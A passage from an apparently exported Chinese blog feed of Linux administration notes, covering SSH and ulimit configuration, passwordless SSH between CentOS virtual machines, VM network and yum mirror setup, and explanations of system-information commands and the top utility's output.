 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /etc/ssh/sshd_config
 
<span class="token comment"># 把 UserLogin 的值改为 yes，并把 # 注释去掉</span>
<span class="token comment"># 重启 sshd 服务： /etc/init.d/sshd restart</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>修改所有 linux 用户的环境变量文件：</p>
 <pre class="line-numbers language-none"><code class="language-none">vi /etc/profile

ulimit -u 10000
ulimit -n 4096
ulimit -d unlimited
ulimit -m unlimited
ulimit -s unlimited
ulimit -t unlimited
ulimit -v unlimited<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h1>虚拟机之间，SSH免密连接</h1>
<pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa
cd /root/.ssh
mv id_rsa.pub authorized_keys_master.pub


scp  authorized_keys_node1.pub root@master:/root/.ssh
scp  authorized_keys_node2.pub root@master:/root/.ssh

cat authorized_keys_master.pub&gt;&gt; authorized_keys
cat authorized_keys_node1.pub&gt;&gt; authorized_keys
cat authorized_keys_node2.pub&gt;&gt; authorized_keys

scp authorized_keys  root@node1:/root/.ssh
scp authorized_keys  root@node2:/root/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>非root权限启用80端口</h1>
<p>服务器一开始重启的时候报错误：</p>
<pre class="line-numbers language-none"><code class="language-none">严重: Failed to initialize end point associated with ProtocolHandler ["http-bio-80"]
java.net.BindException: Permission denied &lt;null&gt;:80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>
<p>因为服务器非root权限用户只能使用1024以下端口。(重启服务时，使用的用户，是非root权限的cxdev用户)：参考，<a href="http://blog.csdn.net/mchdba/article/details/46335861">http://blog.csdn.net/mchdba/article/details/46335861</a></p>
</li>
<li>
<p>解决：重新使用root用户重启服务</p>
</li>
</ul>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>点滴</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos系统安装</title>
    <url>/20221030/1e30df7c.html</url>
    <content><![CDATA[<h1>Centos系统安装</h1>
<h2 id="安装系统">安装系统</h2>
<ol>
<li>
<p>准备安装VMware和下载Centos</p>
</li>
<li>
<p>虚拟网络说明</p>
</li>
</ol>
<ul>
<li>
<p>VMNet1</p>
  <pre class="line-numbers language-none"><code class="language-none">使用的是host-only的链接模式，即虚拟机只能与主机构成内部通信，无法对外网进行访问。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>VMNet0</p>
  <pre class="line-numbers language-none"><code class="language-none">模式：使用桥接模式，安装VM后，在VM里建立虚拟机 默认 就是该模式。
场景：如果你只是需要一台虚拟机可以和宿主互通，并可以访问外网，此模式即可。
描述：安装虚拟机系统后不需要调整网络，物理网络中的 “路由” 所包含的DHCP服务器会自动识别该虚拟机并为其分配IP地址；
如果没有路由，可以自己手动在系统分配，原则是和宿主机在同一网段并指向相同的网关即可通信。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>VMNet8</p>
  <pre class="line-numbers language-none"><code class="language-none">模式：NAT网络模式
场景：在宿主机安装多台虚拟机，和宿主组成一个小局域网，宿主机，虚拟机之间都可以互相通信，虚拟机也可访问外网，例如 搭建 hadoop 集群，分布式服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
</ul>
<ol start="3">
<li>下载虚拟机Centos：<a href="https://www.centos.org/download/">https://www.centos.org/download/</a></li>
</ol>
<h2 id="系统基础配置">系统基础配置</h2>
<h3 id="修改-hotsname">修改 hotsname</h3>
<pre class="line-numbers language-none"><code class="language-none">hostnamectl --static set-hostname 名称 

vi /etc/hostname(缓存？)，要先把这个改好了，下面的配置文件才会生效。 
vi  /etc/sysconfig/network（重启，永久） 
echo hostname &gt; /proc/sys/kernel/hostname（即时生效，临时）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="基础工具安装">基础工具安装</h3>
<ul>
<li>yum -y install wget        (wget)</li>
<li>yum -y install net-tools   (ifconfig)</li>
<li>yum -y install lrzsz   (sz和rz)</li>
<li>yum -y install tree</li>
</ul>
<h3 id="默认ROOT用户登录">默认ROOT用户登录</h3>
<p>使用root账户进入系统后，打开<code>/etc/gdm/custom.conf</code>文件，在[daemon]下添加两行：</p>
<pre class="line-numbers language-none"><code class="language-none">AutomaticLoginEnable=True
AutomaticLogin=root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="虚拟机手动配置静态IP">虚拟机手动配置静态IP</h3>
<ol>
<li>
<pre><code class="language-sh"> cat /etc/sysconfig/network-scripts/ifcfg-ens32
 <pre class="line-numbers language-none"><code class="language-none">
```properties
TYPE=Ethernet
PROXY_METHOD=none
BROWSER_ONLY=no

BOOTPROTO=static
IPADDR=192.168.23.128
NETMASK=255.255.255.0
GATEWAY=192.168.23.2

DEFROUTE=yes
IPV4_FAILURE_FATAL=no
IPV6INIT=yes
IPV6_AUTOCONF=yes
IPV6_DEFROUTE=yes
IPV6_FAILURE_FATAL=no
IPV6_ADDR_GEN_MODE=stable-privacy
NAME=ens32
UUID=066b4926-b40c-4c28-a5b4-2310d2b96613
DEVICE=ens32
ONBOOT=yes
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</code></pre>
</li>
<li>
<p>使用nmcli重新回载网络配置：<code>nmcli c reload</code></p>
</li>
<li>
<p>查看IP：<code>nmcli</code></p>
</li>
</ol>
<h3 id="Centos8-时钟同步">Centos8 时钟同步</h3>
<ol>
<li>
<p>cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</p>
</li>
<li>
<p>vim /etc/chrony.conf</p>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">注释掉 
  pool 2.centos.pool.ntp.org iburst  
加入新的的时间服务器
  server 210.72.145.44 iburst
  server ntp.aliyun.com iburst<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125155904615-1680747826157-1.png" alt="image-20211125155904615"></p>
<p>​</p>
<ol start="3">
<li>
<p>重启服务，此时时间已经与网络时间同步</p>
 <pre class="line-numbers language-none"><code class="language-none">systemctl restart chronyd.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>设置开机自启</p>
 <pre class="line-numbers language-none"><code class="language-none">systemctl enable chronyd.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h3 id="CentOS-8-修改yum源为国内源">CentOS 8 修改yum源为国内源</h3>
<ol>
<li>
<p>备份</p>
<p>目录<code>/etc/yum.repos.d</code>下新建文件夹<code>repo_back_all</code>，内容备份新建的文件夹中</p>
</li>
<li>
<p>修改为阿里云</p>
<p><code>wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo</code></p>
</li>
<li>
<p>删除yum旧的缓存，生成新的换源后的缓存</p>
<p><code>yum clean all</code></p>
<p><code>yum makecache</code></p>
<blockquote>
<p>异常：提示镜像地址404</p>
<p>排查：repo文件中<code>$releasever</code>映射为8，对应的镜像不存在</p>
<p>说明：yum中的变量<code>$releasever</code>是由/etc/yum.conf中的distroverpkg定义的。centos-release为一个rpm包，所谓“distroverpkg=centos-release”的意思，其实是将 $releasever设置为centos-release 这个RPM包的版本号。查看版本号命令：<code>rpm -q centos-release</code></p>
<p>解决：修改yum源文件，把$releasever全部替换为8-strea</p>
</blockquote>
</li>
<li>
<p>cat /etc/yum.repos.d/CentOS-Base.repo</p>
</li>
</ol>
<h2 id="安装图形界面">安装图形界面</h2>
<ul>
<li>
<p>命令安装</p>
<pre class="line-numbers language-none"><code class="language-none">yum groupinstall "X Window System"

yum groupinstall "GNOME Desktop"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>进入图形界面</p>
<pre class="line-numbers language-none"><code class="language-none">startx 或者 init 5 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>修改图形界面为默认启动方式</p>
<pre class="line-numbers language-none"><code class="language-none">命令行输入命令后重启系统 

systemctl set-default graphical.target <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>安装中文支持</p>
<pre class="line-numbers language-none"><code class="language-none">yum groupinstall "Chinese Support" -y <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>修改系统默认语言为中文</p>
<pre class="line-numbers language-none"><code class="language-none">命令行输入命令后重启系统

localectl set-locale LANG=zh_CN.UTF-8 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>图形界面想要卸载</p>
<pre class="line-numbers language-none"><code class="language-none">yum groupremove "GNOME Desktop Environment"
yum groupremove "X Window System"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
</ul>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux查看系统信息</title>
    <url>/20221030/dff104ab.html</url>
    <content><![CDATA[<h1>查看系统内存条信息</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmidecode <span class="token parameter variable">-t</span> memory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125171541505-1678518004369-1.png" alt="image-20211125171541505"></p>
<h1>查看linux机器是32位还是64位</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getconf LONG_BIT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125172057979-1678518004369-3.png" alt="image-20211125172057979"></p>
<h1>查看系统版本号：lsb_release</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lsb_release <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>查看进程状态：ps</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：ps <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token punctuation">[</span>--help<span class="token punctuation">]</span>
参数：
<span class="token parameter variable">-A</span> 列出所有的线程
<span class="token parameter variable">-e</span> 列出所有的进程
<span class="token parameter variable">-f</span> 显示详细的信息（包括命令行参数）

例子: 查看java进程信息
<span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> <span class="token function">java</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>查看系统磁盘信息：df</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">df</span> <span class="token parameter variable">-lm</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>查看内存使用情况</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">free</span> <span class="token parameter variable">-g</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>查看系统内核信息</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>查看系统用户信息：who</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式 <span class="token builtin class-name">:</span> <span class="token function">who</span> - <span class="token punctuation">[</span>husfV<span class="token punctuation">]</span> <span class="token punctuation">[</span>user<span class="token punctuation">]</span>
说明 <span class="token builtin class-name">:</span> 显示有哪些用户登录到系统中，显示的信息包含用户ID，使用的终端，上线时间，呆滞时间，CPU使用量，动作等等。
参数说明 <span class="token builtin class-name">:</span>
    <span class="token parameter variable">-H</span> <span class="token builtin class-name">:</span> 显示标题列
    <span class="token parameter variable">-u</span> <span class="token builtin class-name">:</span> 显示用户的闲置时间
    <span class="token parameter variable">-s</span> <span class="token builtin class-name">:</span> 使用简短的格式来显示
    <span class="token parameter variable">--version</span> <span class="token builtin class-name">:</span> 显示程式版本
    <span class="token parameter variable">-r</span> 查看当前系统运行时间
    <span class="token parameter variable">-b</span> 查看最后一次系统启动的时间。

相关命令 <span class="token builtin class-name">:</span> <span class="token function">who</span> am i  显示当前用户是谁

例子： 查看最后启动时间
          <span class="token function">who</span> <span class="token parameter variable">-b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统命令</title>
    <url>/20221030/b9528813.html</url>
    <content><![CDATA[<h1>不同Linux操作系统的安装命令</h1>
<table>
<thead>
<tr>
<th><strong>系统</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>CentOS</td>
<td>yum</td>
</tr>
<tr>
<td>Debian或Ubuntu Linux</td>
<td>apt-get</td>
</tr>
</tbody>
</table>
<h1>systemctl：系统服务</h1>
<pre class="line-numbers language-none"><code class="language-none">以firewalld.service为例

启动一个服务：systemctl start firewalld.service
关闭一个服务：systemctl stop firewalld.service
重启一个服务：systemctl restart firewalld.service

显示一个服务的状态：systemctl status firewalld.service

在开机时启用一个服务：systemctl enable firewalld.service
在开机时禁用一个服务：systemctl disable firewalld.service

查看服务是否开机启动：systemctl is-enabled firewalld.service
查看开机启动的服务列表：systemctl list-unit-files|grep enabled
查看开机启动的服务列表：systemctl list-unit-files|grep firewalld
查看启动失败的服务列表：systemctl --failed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>ssh：远程登陆</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式: <span class="token function">ssh</span> 用户名@机器名
范例: <span class="token function">ssh</span> rd@build01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1>chown：变更文件夹的所有者</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> 用户名 文件名 <span class="token parameter variable">-R</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>命令行执行sh文件</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">【步骤一】cd到.sh文件所在目录
【步骤二】给.sh文件添加x执行权限 <span class="token function">chmod</span> u+x hello.sh
【步骤三】 ./hello.sh 或者 <span class="token function">sh</span> hello.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1>curl：查看网页结果</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> ipinfo.io/ip
<span class="token function">curl</span> cip.cc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1>scp：从其他机器拷贝文件夹</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-r</span> 文件夹名<span class="token punctuation">(</span>源<span class="token punctuation">)</span> 用户名@机器名:/路径（目的）
之后输入，目标机器的用户密码。
举例： <span class="token function">scp</span> <span class="token parameter variable">-r</span> /index1/DAYAIR/Lucene/20160930  root@117.122.222.74:/index1/dayalib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1>SFTP：上传文件/下载</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">上传： put <span class="token parameter variable">-r</span>  本地文件夹/上传文件夹
put local-file  <span class="token punctuation">[</span>remote-file<span class="token punctuation">]</span>
下载： get remote-file  <span class="token punctuation">[</span>local-file<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1>kill：杀死进程</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式： <span class="token function">kill</span> <span class="token punctuation">[</span> <span class="token parameter variable">-s</span> signal <span class="token punctuation">]</span> pid <span class="token punctuation">..</span>.
      <span class="token function">kill</span> <span class="token parameter variable">-l</span> <span class="token punctuation">[</span> signal <span class="token punctuation">]</span>
说明：kill 送出一个特定的信号 <span class="token punctuation">(</span>signal<span class="token punctuation">)</span> 给进程号为 pid 的进程。根据该信号而做特定的动作, 若没有指定,默认是送出终止 <span class="token punctuation">(</span><span class="token environment constant">TERM</span><span class="token punctuation">)</span> 信号

参数：
    <span class="token parameter variable">-s</span> <span class="token punctuation">(</span>signal<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> 其中常用的一个信号<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> 杀死进程<span class="token punctuation">;</span> 详细的信号可以用 <span class="token function">kill</span> <span class="token parameter variable">-l</span>
    <span class="token parameter variable">-l</span> <span class="token punctuation">(</span>signal<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> 列出所有可用的信号名称

范例：
  <span class="token number">1</span>. 将 pid 为 <span class="token number">323</span> 的进程杀死 ： <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token number">323</span>
  <span class="token number">2</span>. 将 pid 为 <span class="token number">456</span> 的进程重跑 <span class="token punctuation">(</span>restart<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> <span class="token function">kill</span> <span class="token parameter variable">-HUP</span> <span class="token number">456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>ulimit：控制shell程序的资源#</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">语　　法：ulimit <span class="token punctuation">[</span>-aHS<span class="token punctuation">]</span><span class="token punctuation">[</span>-c <span class="token operator">&lt;</span>core文件上限<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-d <span class="token operator">&lt;</span>数据节区大小<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-f <span class="token operator">&lt;</span>文件大 小<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-m <span class="token operator">&lt;</span>内存大小<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-n <span class="token operator">&lt;</span>文件数目<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-p <span class="token operator">&lt;</span>缓冲区大小<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-s <span class="token operator">&lt;</span>堆栈大小<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-t <span class="token operator">&lt;</span>CPU时间<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-u <span class="token operator">&lt;</span>程序数目<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-v <span class="token operator">&lt;</span>虚拟内存大小<span class="token operator">&gt;</span><span class="token punctuation">]</span>
补充说明：ulimit为shell内建指令，可用来控制shell执行程序的资源。
参　　数：
        <span class="token parameter variable">-a</span> 显示目前资源限制的设定。
        <span class="token parameter variable">-c</span> <span class="token operator">&lt;</span>core文件上限<span class="token operator">&gt;</span> 　设定core文件的最大值，单位为区块。
        <span class="token parameter variable">-d</span> <span class="token operator">&lt;</span>数据节区大小<span class="token operator">&gt;</span> 　程序数据节区的最大值，单位为KB。
        <span class="token parameter variable">-f</span> <span class="token operator">&lt;</span>文件大小<span class="token operator">&gt;</span> 　shell所能建立的最大文件，单位为区块。
        <span class="token parameter variable">-H</span> 　设定资源的硬性限制，也就是管理员所设下的限制。
        <span class="token parameter variable">-m</span> <span class="token operator">&lt;</span>内存大小<span class="token operator">&gt;</span> 　指定可使用内存的上限，单位为KB。
        <span class="token parameter variable">-n</span> <span class="token operator">&lt;</span>文件数目<span class="token operator">&gt;</span> 　指定同一时间最多可打开的文件数。
        <span class="token parameter variable">-p</span> <span class="token operator">&lt;</span>缓冲区大小<span class="token operator">&gt;</span> 　指定管道缓冲区的大小，单位512字节。
        <span class="token parameter variable">-s</span> <span class="token operator">&lt;</span>堆栈大小<span class="token operator">&gt;</span> 　指定堆叠的上限，单位为KB。
        <span class="token parameter variable">-S</span> 　设定资源的弹性限制。
        <span class="token parameter variable">-t</span> <span class="token operator">&lt;</span>CPU时间<span class="token operator">&gt;</span> 　指定CPU使用时间的上限，单位为秒。
        <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>进程数目<span class="token operator">&gt;</span> 　用户最多可启动的进程数目。
        <span class="token parameter variable">-v</span> <span class="token operator">&lt;</span>虚拟内存大小<span class="token operator">&gt;</span> 　指定可使用的虚拟内存上限，单位为KB。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>top：实时显示系统中各个进程的资源占用状况</h1>
<p>top命令是Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。</p>
<blockquote>
<p>下面详细介绍它的使用方法。</p>
</blockquote>
<p>top是一个动态显示过程,即可以通过用户按键来不断刷新当前状态.如果在前台执行该命令,它将独占前台,直到用户终止该程序为止.比较准确的说,top命令提供了实时的对系统处理器的状态监视.它将显示系统中CPU最“敏感”的任务列表.该命令可以按CPU使用.内存使用和执行时间对任务进行排序；而且该命令的很多特性都可以通过交互式命令或者在个人定制文件中进行设定</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">命令说明
<span class="token number">1</span>.  命令格式： <span class="token function">top</span> <span class="token punctuation">[</span>参数<span class="token punctuation">]</span>
<span class="token number">2</span>.  命令功能： 显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率、CPU占用率等
<span class="token number">3</span>.  命令参数
        <span class="token parameter variable">-b</span> 批处理
        <span class="token parameter variable">-c</span> 显示完整的治命令
        <span class="token parameter variable">-I</span> 忽略失效过程
        <span class="token parameter variable">-s</span> 保密模式
        <span class="token parameter variable">-S</span> 累积模式
        -i<span class="token operator">&lt;</span>时间<span class="token operator">&gt;</span> 设置更新间隔时间
        -u<span class="token operator">&lt;</span>用户名<span class="token operator">&gt;</span> 指定用户名
        -p<span class="token operator">&lt;</span>进程号<span class="token operator">&gt;</span> 指定进程
        -n<span class="token operator">&lt;</span>次数<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>补充top使用技巧</p>
</blockquote>
<ul>
<li>
<p>多核CPU监控在top基本视图中，按键盘数字“1”，可监控每个逻辑CPU的状况：</p>
</li>
<li>
<p>高亮显示当前运行进程敲击键盘“b”（打开/关闭加亮效果 ）</p>
</li>
<li>
<p>通过”shift + &gt;”或”shift + &lt;”可以向右或左改变排序列下图是按一次”shift + &gt;”的效果图,视图现在已经按照%MEM来排序。</p>
</li>
</ul>
<blockquote>
<p>使用实例</p>
</blockquote>
<ul>
<li>
<p>实例1：显示指定的进程信息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">top</span> <span class="token parameter variable">-p</span> <span class="token number">2885</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125180715469.png" alt="image-20211125180715469"></p>
</li>
<li>
<p>实例2: 循环显示的次数</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">命令：  <span class="token function">top</span> <span class="token parameter variable">-n</span> <span class="token number">2</span>
说明：表示更新两次后终止更新显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>实例3：显示进程信息，并具体说明</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20211125181146934.png" alt="20211125181146934"></p>
</li>
</ul>
<blockquote>
<p>下面我们看每一行信息的具体意义</p>
</blockquote>
<ol>
<li>第一行，任务队列信息，同 <strong>uptime</strong> 命令的执行结果</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">top</span> - <span class="token number">18</span>:10:32 up  <span class="token number">2</span>:39,  <span class="token number">2</span> users,  load average: <span class="token number">0.23</span>, <span class="token number">0.11</span>, <span class="token number">0.06</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>18:10:32</td>
<td>当前系统时间</td>
</tr>
<tr>
<td>up   2:39</td>
<td>系统已经运行了2小时39分钟（在这期间系统没有重启过）</td>
</tr>
<tr>
<td>2 users</td>
<td>当前有2个用户登录系统</td>
</tr>
<tr>
<td>load average: 0.23, 0.11, 0.06</td>
<td>load average后面的三个数分别是1分钟、5分钟、15分钟的负载情况。<br>load average数据是每隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。</td>
</tr>
</tbody>
</table>
<ol start="2">
<li>第二行，Tasks — 任务（进程）</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Tasks: <span class="token number">213</span> total,   <span class="token number">1</span> running, <span class="token number">210</span> sleeping,   <span class="token number">0</span> stopped,   <span class="token number">2</span> zombie

具体信息说明如下：
系统现在共有213个进程，其中处于运行中的有1个，210个在休眠，stoped状态的有0个，zombie状态（僵尸）的有2个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ol start="3">
<li>第三行：cpu状态信息</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">%Cpu<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:  <span class="token number">0.7</span> us,  <span class="token number">0.6</span> sy,  <span class="token number">0.0</span> ni, <span class="token number">98.7</span> id,  <span class="token number">0.0</span> wa,  <span class="token number">0.0</span> hi,  <span class="token number">0.1</span> si,  <span class="token number">0.0</span> st

备注：在这里CPU的使用比率和windows概念不同，需要理解linux系统用户空间和内核空间的相关知识<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>0.7 us</td>
<td>用户空间占用CPU的百分比。</td>
</tr>
<tr>
<td>0.6 sy</td>
<td>内核空间占用CPU的百分比。</td>
</tr>
<tr>
<td>0.0 ni</td>
<td>改变过优先级的进程占用CPU的百分比</td>
</tr>
<tr>
<td>98.7 id</td>
<td>空闲CPU百分比</td>
</tr>
<tr>
<td>0.0 wa</td>
<td>IO等待占用CPU的百分比</td>
</tr>
<tr>
<td>0.0 hi</td>
<td>硬中断（Hardware IRQ）占用CPU的百分比</td>
</tr>
<tr>
<td>0.1 si</td>
<td>软中断（Software Interrupts）占用CPU的百分比</td>
</tr>
<tr>
<td>0.0 st</td>
<td>虚拟机占用百分比</td>
</tr>
</tbody>
</table>
<ol start="4">
<li>第四行,内存状态</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">KiB Mem <span class="token builtin class-name">:</span> <span class="token number">16212604</span> total,  <span class="token number">4243632</span> free, <span class="token number">10135032</span> used,  <span class="token number">1833940</span> buff/cache

第四行中使用中的内存总量（used）指的是现在系统内核控制的内存数，空闲内存总量（free）是内核还未纳入其管控范围的数量。
纳入内核管理的内存不见得都在使用中，还包括过去使用过的现在可以被重复利用的内存，内核并不把这些可被重新使用的内存交还到free中去，因此在linux上free内存会越来越少，但不用为此担心。

若需要计算可用内存数，这里有个近似的计算公式：第四行的free + 第四行的buffers + 第五行的cached/avail Mem

对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>16212604 total</td>
<td>物理内存总量</td>
</tr>
<tr>
<td>10135032 used</td>
<td>使用中的内存总量</td>
</tr>
<tr>
<td>4243632 free</td>
<td>空闲内存总量</td>
</tr>
<tr>
<td>1833940 buff/cache</td>
<td>缓存的内存量</td>
</tr>
</tbody>
</table>
<ol start="5">
<li>第五行，swap交换分区信息</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">KiB Swap:  <span class="token number">8126460</span> total,  <span class="token number">8126460</span> free,        <span class="token number">0</span> used.  <span class="token number">5577340</span> avail Mem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>参数</th>
